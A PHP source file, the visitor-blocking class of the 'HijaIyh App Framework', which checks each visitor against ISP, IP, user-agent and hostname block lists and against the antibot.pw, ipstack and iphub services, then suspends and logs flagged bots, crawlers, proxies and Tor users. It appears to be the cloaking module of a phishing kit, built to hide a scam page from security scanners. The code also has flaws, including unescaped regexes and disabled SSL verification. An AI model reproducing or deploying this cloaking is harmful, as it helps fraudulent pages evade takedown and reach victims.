<?php 
/** HijaIyh App Framework
* @author justalinko
* @version 2.1
**/

Class hiblocker{

public $ispfile = 'HijaIyh_App/config/isp-block.iyh.txt';
public $ipfile  = 'HijaIyh_App/config/ip-blacklist.iyh.txt';
public $agentfile = 'HijaIyh_App/config/useragent-block.iyh.txt';
public $hostfile = 'HijaIyh_App/config/hostname-block.iyh.txt';
public $ipstack_api;
public $antibot_api;

public function __construct()
{
  $core = new hicore;
  $this->ipstack_api =$core->parse_hijaiyh('apikey','ipstack');
  $this->antibot_api = $core->parse_hijaiyh('apikey','antibot');
}
public function logbot($type,$content)
{
  switch ($type) {
    case 'bot':
      $file = dirname(dirname(__DIR__)).'/HijaIyh_App/stats/bot.hijaiyh.html';
      break;
      case 'ip':
      $file = dirname(dirname(__DIR__)).'/HijaIyh_App/stats/ip-blacklist.iyh.html';
      break;
      case 'isp':
      $file = dirname(dirname(__DIR__)).'/HijaIyh_App/stats/isp-block.iyh.html';
      break;
      case 'host':
      $file = dirname(dirname(__DIR__)).'/HijaIyh_App/stats/hostname-block.iyh.html';
      break;
      case 'agent':
      $file = dirname(dirname(__DIR__)).'/HijaIyh_App/stats/useragent-block.iyh.html';
      break;
      case 'proxy':
      $file = dirname(dirname(__DIR__)).'/HijaIyh_App/stats/proxy-block.iyh.html';
      break;
  }
  $core = new hicore;
  $fp = fopen($file,'a');
  fwrite($fp,$core->statsformat($content).PHP_EOL);
  fclose($fp);
}
public function ipstack($module)
{
  $core =new hicore;
   $ch = curl_init();
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_URL, "http://api.ipstack.com/".$core->userIP()."?access_key=".$this->ipstack_api."&".$module."=1");
        $data = curl_exec($ch);
        curl_close($ch);
        $json =json_decode($data,true);
        return $json;
}
public function antibot()
{
  $core = new hicore;
  if($_SESSION['antibot_wasChecked'] == false || !isset($_SESSION['antibot_wasChecked'])){

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_USERAGENT, "Antibot Blocker");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_URL, "https://antibot.pw/api/v2-blockers?ip=".$core->userIP()."&apikey=".$this->antibot_api."&ua=".urlencode($_SERVER['HTTP_USER_AGENT']) );
        $data = curl_exec($ch);
        curl_close($ch);

        $_SESSION['antibot_wasChecked'] = true;

        $x = json_decode($data,true);
        if($x['is_bot']){
          
          $_SESSION['is_bot']  = true;

          $this->logbot('bot',$core->userIP().' => Blocked by ANTIBOT.PW');
          $core->suspend();

          exit;
        }else{
          $_SESSION['is_bot']  = false;
        }

    }

    if($_SESSION['is_bot'] == true){
      $core->suspend();
    }

}
	public function one_time($ip)
	{
		$fp = @file_put_contents('./.htaccess',"Deny from $ip \n",FILE_APPEND);
  		return $fp;
	}

	public function get_file($type)
{
  $base = dirname(dirname(__DIR__)).'/';
  switch ($type) {
    case 'ip':
      $file = json_decode(@file_get_contents($base.$this->ipfile),true);
      break;
    case 'isp':
      $file = json_decode(@file_get_contents($base.$this->ispfile),true);
      break;
    case 'agent':
      $file = json_decode(@file_get_contents($base.$this->agentfile),true);
      break;
    case 'host':
      $file = json_decode(@file_get_contents($base.$this->hostfile),true);
      break;
  }
  return $file;
}
public function run_blocker($isp,$data=array())
{
    $core =new hicore;
   // Blocker ISP
    if($core->parse_hijaiyh('blocker','isp') == 1 && $core->empty_session('hiblocker_isp')){
    $this->block_isp($isp);
    $core->create_session(['hiblocker_isp' => true]);
    }
    // Blocker IP
    if($core->parse_hijaiyh('blocker','ip') == 1 && $core->empty_session('hiblocker_ip')){
    $this->block_ip();
    $core->create_session(['hiblocker_ip' => true]);
    }
    // Blocker Agent
    if($core->parse_hijaiyh('blocker','agent') == 1 && $core->empty_session('hiblocker_agent')){
    $this->block_agent();
    $core->create_session(['hiblocker_agent' => true]);
    }
    // Blocker Hostname
    if($core->parse_hijaiyh('blocker','host') == 1 && $core->empty_session('hiblocker_host')){
    $this->block_host();
    $core->create_session(['hiblocker_host' => true]);
    }
    // Blocker Proxy
    if($core->parse_hijaiyh('blocker','proxy') == 1 && $core->empty_session('hiblocker_proxy')){
    $this->block_proxy();
    $core->create_session(['hiblocker_proxy' => true]);
    }
    // Blocker dinamic
    if($core->parse_hijaiyh('blocker','dinamic') == 1 && $core->empty_session('hiblocker_dinamic')){
    $this->dinamic_block($data);
    $core->create_session(['hiblocker_dinamic' => true]);
    }

    // blocker by antibot.pw

    if($this->antibot_api != '' || !empty($this->antibot_api))
    {
      $this->antibot();
    }

    // blocker by ipstack

    if($this->ipstack_api != '' || !empty($this->ipstack_api))
    {
      $joko = $this->ipstack('security');
      if(is_array(@$joko['security']))
      {
        $botgak = @$joko['security'];
        if($botgak['is_proxy']==true || $botgak['is_crawler'] ==true || $botgak['is_tor'] == true)
        {
          
      $this->logbot('bot',' Blocked by ipstack');
      $core->suspend();exit;
        }
      }
    }
  
}
public function block_ip()
{
	$core = new hicore;
  $listip = $this->get_file('ip');

  $true = 0;
  $false = 0;
  $ipnya = $core->userIP();
  foreach($listip as $ip)
  {
    if(@preg_match("/".$ip."/",$core->userIP()))
    {
      $true++;
    }else{
      $false++;
    }
  }
  if($true > 0)
  {
    $this->logbot('ip',$ipnya.' => Blocked by IP Blacklist 2019');
      $this->logbot('bot',$ipnya.' => Blocked by IP Blacklist 2019');
      $core->suspend();exit;
  }
}
public function dinamic_block($data = array())
{
	$core = new hicore;
	$api = new hiapi($data[0],$data[1],$data[2]);
	
    $ip = $api->botIp($core->userIP());
    $agent = $api->crawler($_SERVER['HTTP_USER_AGENT']);
    $true=0;
    //print_r($ip);print_r($data);
    if($ip['bot'] == 1 || $ip['status'] == 'valid')
    {
      $true++;
    }
    $true2 = 0;
    if($agent['bot'] == 1 || $agent['status'] == 'valid')
    {
      $true2++;
      
    }

    if($true > 0)
    {
          $this->logbot('ip',$ip['ip'].' => Blocked by Dinamic blocker');
      $this->logbot('bot',$ip['ip'].' => Blocked by Dinamic blocker ');
      $core->suspend();exit;
    }
    if($true2 > 0)
    {
         $this->logbot('agent',$agent['agent'].' => Blocked by  Dinamic blocker ');
      $this->logbot('bot',$agent['agent'].' => Blocked by IP  Dinamic blocker ');
      $core->suspend();exit;
    }
}

public function block_isp($isp = null)
{
  $core = new hicore;
  $listisp = $this->get_file('isp');
  if($isp != null)
  {
    $true=0;
  foreach($listisp as $ispa)
  {
    if(substr_count(strtolower($ispa),strtolower($isp)) > 0 )
    {
      $true++;
    }
  }
   if($true > 0)
  {
     $this->logbot('isp',$isp.' => Blocked by ISP Block 2019');
      $this->logbot('bot',$isp.' => Blocked by ISP Block 2019');
      $core->suspend();exit;
  }
  }
 
}

public function block_agent()
{
  $core = new hicore;
  $true=0;
  $agentnya=strtolower($_SERVER['HTTP_USER_AGENT']);
  $listua = $this->get_file('agent');
  foreach($listua as $agent)
  {
    if(substr_count(strtolower($agent),$agentnya) > 0 )
    {
      $true++;
    }
  }
  if($true> 0)
  {
    $this->logbot('agent',$agentnya.' => Blocked by userAgent Block ');
      $this->logbot('bot',$agentnya.' => Blocked by userAgent Block ');
      $core->suspend();exit;
  }
}
public function block_host()
{
  $core = new hicore;
  $listhost = $this->get_file('host');
  $hostnya=strtolower(gethostbyaddr($_SERVER['REMOTE_ADDR']));
  $true=0;
  foreach($listhost as $host)
  {
    if(substr_count(strtolower($host),$hostnya) > 0 )
    {
      $true++;
    }
  }
  if($true > 0)
  {
    $this->logbot('host',$hostnya.' => Blocked by Hostname Block ');
      $this->logbot('bot',$hostnya.' => Blocked by Hostname Block ');
      $core->suspend();exit;
  }
}
  public function block_proxy()
  {
  	$core = new hicore;
    $ip = $core->userIP();
     $ch = curl_init();

        curl_setopt($ch, CURLOPT_URL, "https://v2.api.iphub.info/guest/ip/$ip");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $result = curl_exec($ch);
        if (curl_errno($ch))
        {
            echo 'Error:' . curl_error($ch);
        }
        curl_close($ch);
        $json = json_decode($result, true);
        $vpn = $json["block"];

        if($vpn == 1)
        {
           $this->logbot('proxy',$core->userIP().' => Blocked by Proxy Block');
      $this->logbot('bot',$core->userIP().' => Blocked by Proxy Block');
      $core->suspend();exit;
        }
  }

}